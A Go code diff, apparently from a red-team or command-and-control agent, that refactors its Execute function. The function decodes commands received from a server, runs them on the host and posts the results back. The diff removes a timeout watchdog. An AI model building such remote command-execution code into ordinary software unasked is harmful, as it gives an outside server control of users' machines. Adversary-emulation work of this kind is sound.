@@ -9,7 +9,6 @@ import (
 	"net/http"
 	"os"
 	"path/filepath"
-	"reflect"
 	"runtime"
 	"strings"
 
@@ -18,8 +17,6 @@ import (
 )
 
 const (
-	// TIMEOUT in seconds represents how long a single command should run before timing out
-	TIMEOUT = 60
 	OK = 200
 )
 
@@ -62,33 +59,15 @@ func Drop(server string, payload string) string {
 
 // Execute executes a command and posts results
 func Execute(profile map[string]interface{}, command map[string]interface{}, payloads []string) {
-	timeoutChan := make(chan bool, 1)
-	resultChan := make(chan map[string]interface{}, 1)
 	cmd := string(util.Decode(command["command"].(string)))
-	status := "0"
+	var status string
 	var result []byte
 	missingPaths := checkPayloadsAvailable(payloads)
 	if len(missingPaths) == 0 {
-		go util.TimeoutWatchdog(timeoutChan, TIMEOUT)
-		go execute.Execute(cmd, command["executor"].(string), profile["platform"].(string), resultChan)
-	ExecutionLoop:
-		for {
-			select {
-			case data := <-resultChan:
-				result = reflect.ValueOf(data["result"]).Bytes()
-				if reflect.ValueOf(data["err"]).IsValid() {
-					status = "1"
-				}
-				break ExecutionLoop
-			case <-timeoutChan:
-				result = []byte("Command execution timed out.")
-				status = "124"
-				break ExecutionLoop
-			}
-		}
+		result, status = execute.Execute(cmd, command["executor"].(string), profile["platform"].(string))
 	} else {
-		status = "1"
 		result = []byte(fmt.Sprintf("Payload(s) not available: %s", strings.Join(missingPaths, ", ")))
+		status = execute.ERROR_STATUS
 	}
 	sendExecutionResults(command["id"], profile["server"], result, status, cmd)
 }
